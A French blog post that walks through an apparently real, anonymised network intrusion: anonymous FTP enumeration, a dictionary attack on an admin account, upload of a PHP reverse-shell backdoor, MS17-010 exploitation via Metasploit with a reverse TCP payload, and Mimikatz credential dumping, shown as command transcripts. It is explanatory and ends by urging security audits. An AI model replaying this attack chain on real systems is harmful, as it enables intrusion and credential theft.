---
layout: post
title:  "Anatomie d'une attaque informatique"
date:   2018-02-17 21:14:48 +0100
---

Au cours de cet article, je vous propose de décortiquer le processus d'une attaque informatique à distance. Il s'agit d'un cas réel, pour lequel l'entreprise a entrepris des actions correctives. Pour des raisons éthiques, toute information potentiellement sensible a été anonymisée ou supprimée.

Comme l'indique le schéma ci-après, un attaquant (à droite et en rouge) connecté à internet, tente de s'introduire sur le réseau de l'entreprise (à gauche).

![](/notes/img/20180217102110-attaque-informatique.png)

#### Phase 1 - Découverte
En premier lieu l'attaquant va énumérer les services logiciels fournis par l'entreprise sur internet. Bien souvent le management n'a pas connaissance de l'existence de ses services, et des risques encourus
L'attaquant découvre :

- Un site internet
- Un serveur de transfert de fichiers (FTP)

Le serveur FTP est accessible en mode _anonyme_, ce qui permet une connexion sans pouvoir utiliser les fonctions de transfert de fichier. On peut considérer que le mode anonyme est "sécurisé". Toutefois il permet d'obtenir une information qui peut paraître anodine, mais qui a une grande importance pour la suite : le nom de compte d'un utilisateur "administrateur" peut être découvert lors d'une connexion anonyme.

	root@attaquant:~ $ ftp ftp.entreprise.fr
	Connected to ftp.entreprise.fr.
	220 xxx.xxx.xxx.xxx FTP server ready
	Name (ftp.entreprise.fr:root): anonymous
	331 Anonymous login ok, send your complete email address as your password
	Password:
	230 Anonymous access granted, restrictions apply
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> passive
	Passive mode on.

La commande `ls -lha` donne l'information concernant la présence d'un compte "admin" sur le serveur FTP.

	ftp> ls -lha
	227 Entering Passive Mode
	150 Opening ASCII mode data connection for file list
	drwxr-s---   2 admin    group       4.0k Dec  6  2017 .
	drwxr-s---   2 admin    group       4.0k Dec  7  2017 ..
	226 Transfer complete
	ftp>

#### Phase 2 - tentative d'accès non autorisé
L'attaquant sait désormais qu'une personne s'identifie auprès du serveur en tant que "admin".
Il va mener sur ce compte une simple attaque basée sur un dictionnaire de mots de passe. Ces dictionnaires sont librement téléchargeables sur le web.

Grâce à des outils comme **hydra** ou **medusa**, l'attaquant obtient le mot de passe du compte FTP admin.

    ACCOUNT FOUND: [ftp] Host : xxx.xxx.xxx.xxx
    User: admin Password: tintin [SUCCESS]

#### Phase 3 - obtenir un accès plus complet au serveur
Désormais l'attaquant en tant qu'admin, possède des permissions d'écriture sur le serveur web.
Il lui est donc permis d'envoyer sur le serveur une backdoor qui établira une connexion vers sa machine quand elle sera exécutée.


	ftp> cd html
	250 CWD command successful
	ftp> put shell.php
	local: shell.php remote: shell.php
	227 Entering Passive Mode.
	150 Opening BINARY mode data connection for shell.php
	226 Transfer complete
	1113 bytes sent in 0.00 secs (14.9499 MB/s)

L'éxécution de shell.php initie une connexion vers la machine de l'attaquant. Ce dernier dispose ainsi d'un shell sur le serveur (et plus seulement un accès FTP) qui lui permet de mener d'autres actions sur le réseau interne de l'entreprise.


#### Phase 4 : identifications des machines du réseau et de leurs vulnérabilités
L'attaquant balaie et identifie les machines du réseau. Il découvre un serveur Active Directory vulnérable à MS17-010.

	msf > use auxiliary/scanner/smb/smb_ms17_010
	msf auxiliary(scanner/smb/smb_ms17_010) > set RSHOSTS xxx.xxx.xxx.xxx/24
	rhosts => xxx.xxx.xxx.xxx/24
	msf auxiliary(scanner/smb/smb_ms17_010) > run
	[+] xxx.xxx.xxx.xxx:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard
	[*] Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed

#### Phase 5 : exploitation de la vulnérabilité MS17-010
Grâce au framework metasploit, l'attaquant exploite la vulnérabilité MS17-010 non corrigée et obtient un accès au serveur Active Directory.

	msf auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_psexec
	msf exploit(windows/smb/ms17_010_psexec) > set RHOST xxx.xxx.xxx.xxx
	msf exploit(windows/smb/ms17_010_psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
	msf exploit(windows/smb/ms17_010_psexec) > set LPORT 443
	msf exploit(windows/smb/ms17_010_psexec) > run
	[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:443
	[*] xxx.xxx.xxx.xxx:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
	[*] xxx.xxx.xxx.xxx:445 - Built a write-what-where primitive...
	[+] xxx.xxx.xxx.xxx:445 - Overwrite complete... SYSTEM session obtained!
	[*] xxx.xxx.xxx.xxx:445 - Selecting PowerShell target
	[*] xxx.xxx.xxx.xxx:445 - Executing the payload...
	[+] xxx.xxx.xxx.xxx:445 - Service start timed out, OK if running a command or non-service executable...
	[*] Sending stage (179779 bytes) to xxx.xxx.xxx.xxx
	[*] Meterpreter session 3 opened (xxx.xxx.xxx.xxx:443 -> xxx.xxx.xxx.xxx:46491) at 2018-02-10 15:20:38
	meterpreter > background
	[*] Backgrounding session 3...

#### Phase 6 : obtention du mot de passe administrateur du domaine
Grâce à Mimikatz l'attaquant obtient le mot de passe administrateur du domaine, stocké en clair dans la mémoire de la machine.

	meterpreter> load Mimikatz
	meterpreter> wdigest
	0;1368385624  Kerberos   DOMAINE     netadmin       	 1234
	0;2500325002  Kerberos   DOMAINE     user1        	 password1
	0;68817461    Kerberos   DOMAINE     user2          	 password2
	0;2599386119  Kerberos   DOMAINE     user3		password3
	0;2600098700  Kerberos   DOMAINE     administrateur	Very$ecureP@ssw0rdVeryL0ngAndDifficultToGuess
	0;2581308498  Kerberos   DOMAINE     user8         	password8
	0;2589349129  Kerberos   DOMAINE     user4     		password4
	0;2597681195  Kerberos   DOMAINE     user5      	password5
	0;2597641064  Kerberos   DOMAINE     user6         	password6
	0;2595339032  Kerberos   DOMAINE     user7         	password7


L'accès administrateur du domaine étant obtenu, l'attaquant poursuit ses investigations sur l'ensemble des systèmes du réseau, à la recherche d'information sensibles.

#### Conclusion

L’enchaînement de plusieurs vulnérabilités peut mener à la compromission d'un réseau informatique  : tester et auditer votre sécurité.


Tags: pentest
